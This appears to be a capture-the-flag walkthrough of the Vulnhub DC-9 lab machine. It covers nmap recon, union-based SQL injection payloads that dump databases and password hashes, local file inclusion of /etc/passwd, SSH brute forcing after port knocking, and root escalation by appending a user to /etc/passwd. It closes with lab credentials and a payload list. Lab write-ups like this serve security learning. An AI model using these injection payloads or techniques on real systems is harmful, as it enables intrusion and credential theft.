# Vulnhub-DC 9

## NMAP
```bash

nmap -sC -sV 192.168.1.7

Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-16 09:31 PKT
Nmap scan report for 192.168.1.7
Host is up (0.00021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp filtered  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:b3:38:74:32:74:0b:c5:16:dc:13:de:cb:9b:8a:c3 (RSA)
|   256 06:5c:93:87:15:54:68:6b:88:91:55:cf:f8:9a:ce:40 (ECDSA)
|_  256 e4:2c:88:da:88:63:26:8c:93:d5:f7:63:2b:a3:eb:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 08:00:27:1B:8F:38 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

## PORT 80 (HTTP)

<img src="https://imgur.com/wMTyQ9t.png"/>

Going to `Display All Records`

we can see information of users

<img src="https://i.imgur.com/vJVgcUf.png"/>

We can a login page , lets' try to do some basic sqli stuff

<img src="https://imgur.com/YIhwdhT.png"/>

I tried `admin ' or 1=1 #` , `admin' or 1=1 -- ` , but both failed

<img src="https://imgur.com/IBCnjDr.png"/>

Going over to `search.php` we can see that it searches for a name so let's supply the name `mary` since information for that user exists

<img src="https://imgur.com/O4Ao6Pe.png"/>

Here let's perform a query `mary' and 1=1 # ` to see if it still returns us information of mary

<img src="https://imgur.com/jAPaRIX.png"/>

<img src="https://imgur.com/ptYnVv1.png"/>

It does , so here we can actually sqli but first we need to identify how many columns are there to do that we are going to ultize `order by <number>` which will sort by value of the number of column of provide , we will keep increasing the number we get no repsonse so,

`mary' order by 1 #`

<img src="https://imgur.com/DYR1asi.png"/>
I kept getting result till  till 6 columns but after that I get no response

<img src="https://imgur.com/k7vMuoM.png"/>

<img src="https://imgur.com/DjNkMxD.png"/>

Which means we have 6 columns so we can now perform sql injection

`mary' union select version(),user(),database(),4,5,6 #`

<img src="https://i.imgur.com/MxEOkzA.png"/>

This machine is using MariaDB, user for the database client is dbuser and the database name is Staff , now we need to extract table name ,then the columns and the exfiltrate the data

We can only perform a query to give us all the names for database

```
mary' union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata #
```

<img src="https://i.imgur.com/4pTkqZv.png"/>

So there two databases but right now let's just focus on `Staff`


```
mary' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() #
```

<img src="https://i.imgur.com/e4yvYtY.png"/>

We have two tables , `StaffDetails` and `Users` so let's see column names for Users table

```
mary' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='Users' #
```

<img src="https://i.imgur.com/1xqzABC.png"/>

We have the column names , we are intersted in username and password so let's just extract the data

<img src="https://i.imgur.com/b0HMGm0.png"/>

And we got the user name password hash , this could have been done with sqlmap easilty by just intercepting the request from `search.php` and saving it to a file and running it against sqlmap

<img src="https://i.imgur.com/VYgL09W.png"/>

<img src="https://i.imgur.com/CiocyQU.png"/>

Let's visit crackstation 

<img src="https://i.imgur.com/TBizxi7.png"/>

As soon as we log in we'll get an error

<img src="https://i.imgur.com/xibM8xS.png"/>

I tried the parameter `file` and got the contents of `/etc/passwd`

<img src="https://imgur.com/9pjNcw7.png"/>

So I copied the results in a file and grab the users only 

<img src="https://imgur.com/Z4fy4Jh.png"/>

<img src="https://imgur.com/SEVrVLM.png"/>

Now remeber that we had 2 databases `Staff` and `users` , let's use sqlmap to dump data from users database

<img src="https://imgur.com/FQSbfcN.png"/>

<img src="https://i.imgur.com/SlMui9x.png"/>

I have already saved the usernames ,let's just grab the password and start brute forcing aginst SSH 
<img src="https://imgur.com/O5LsSck.png"/>

But ssh is filtered so we are going to first see if we can find a port knocking configuration or not 

<img src="https://i.imgur.com/KY7pFuF.png"/>

Now can perform port-knocking to open ssh port

<img src="https://imgur.com/onQzbec.png"/>

We found 2 passwords with brute forcing

<img src="https://imgur.com/hZHQc4y.png"/>

<img src="https://imgur.com/SLgwuOJ.png"/>

<img src="https://imgur.com/4s5mbaT.png"/>

After logging in with `janitor` we can find more passwords

<img src="https://i.imgur.com/BQUSSXB.png"/>

Let's add those passwords and again try brute forcing

<img src="https://i.imgur.com/bbX8P5r.png"/>

<img src="https://imgur.com/rTM4GXL.png"/>

Switching to user `fredf` we can that can run the file test as sudo

<img src="https://i.imgur.com/aA6ezrt.png"/>

<img src="https://imgur.com/3UZYm1H.png"/>

It's a binary , let's try to execute it and see what happens

<img src="https://i.imgur.com/GtQ6sQY.png"/>

Wierd it says test.py which is a python file which reads and appends so we need to find that python file

<img src="https://i.imgur.com/fO6V4tQ.png"/>

And we found it

<img src="https://i.imgur.com/tSAUzAa.png"/>

So going through the source code , it's going to take 2 arguments as file , it's going to read the contents from first file store it in variable then it's going to append the contents in the file we specify we could exploit this by first adding a root user in a file then reading the contents from there and appending it to `/etc/passwd` file

<img src="https://imgur.com/0xxtn7u.png"/>

<img src="https://imgur.com/gdFtj7u.png"/>

Now let's see if this actually worked or not

<img src="https://i.imgur.com/q1aN2N7.png"/>

<img src="https://i.imgur.com/Ou3Am93.png"/>

This has added a user so we can switch to this user and become root

<img src="https://imgur.com/h0UuulA.png"/>

admin:transorbital1


```
chandlerb:UrAG0D!
janitor: Ilovepeepee
joeyt: Passw0rd
fredf: B4-Tru3-001 
```
mary' union select 1,2,3,4,5,6 #

mary' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() #

mary' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='Users' #

mary' union select group_concat(Username),group_concat(Password),3,4,5,6 from 'Users' #

mary' union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata #
